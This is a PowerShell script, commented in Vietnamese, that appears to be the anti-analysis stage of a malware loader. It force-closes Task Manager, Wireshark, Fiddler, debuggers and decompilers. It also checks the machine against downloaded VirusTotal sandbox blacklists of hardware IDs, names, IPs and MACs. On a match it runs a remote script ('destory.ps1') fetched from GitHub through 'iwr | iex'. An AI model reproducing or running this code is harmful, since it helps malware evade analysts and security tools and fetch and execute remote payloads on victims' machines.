$2kill = @('cmd', 'taskmgr', 'process', 'processhacker', 'ksdumper', 'fiddler', 'httpdebuggerui', 'wireshark', 'httpanalyzerv7', 'fiddler', 'decoder', 'regedit', 'procexp', 'dnspy', 'vboxservice', 'burpsuit', 'DbgX.Shell', 'ILSpy')

foreach ($prg in $2kill) {
    $rprc = Get-Process -Name $prg -ErrorAction SilentlyContinue
    if ($rprc) {
        Stop-Process -Name $prg -Force 
        Write-Host "[+] Closed process: $prg" -ForegroundColor Yellow
    }
}

if ($env:LOGONSERVER -match "DADDYSERVER") {
    iwr "https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/destory.ps1" | iex
}

# Hàm tải danh sách từ GitHub
function Get-RemoteList($url) {
    try {
        return (Invoke-WebRequest -Uri $url -UseBasicParsing).Content -split "`n"
    } catch {
        return @()
    }
}

# Tải các danh sách blacklist
$hwidList = Get-RemoteList "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt"
$pcNameList = Get-RemoteList "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt"
$userList = Get-RemoteList "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt"
$ipList = Get-RemoteList "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt"
$macList = Get-RemoteList "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt"
$gpuList = Get-RemoteList "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/gpu_list.txt"
$platformList = Get-RemoteList "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_platforms.txt"

# Lấy thông tin máy
$pcName = $env:COMPUTERNAME
$userName = $env:USERNAME
$ip = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").ip
$mac = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress })[0].MACAddress
$gpu = (Get-WmiObject Win32_VideoController).Name
$platform = (Get-WmiObject Win32_OperatingSystem).Caption

# Tạo fake HWID (tuỳ môi trường thật)
$hwid = (Get-WmiObject Win32_ComputerSystemProduct).UUID

# Kiểm tra match blacklist
if (
    $hwidList -contains $hwid -or
    $pcNameList -contains $pcName -or
    $userList -contains $userName -or
    $ipList -contains $ip -or
    $macList -contains $mac -or
    ($gpuList | Where-Object { $gpu -like "*$_*" }) -or
    ($platformList | Where-Object { $platform -like "*$_*" })
) {
    iwr "https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/destory.ps1" | iex
}

Write-Host "✅ Máy sạch, tiếp tục chạy..."
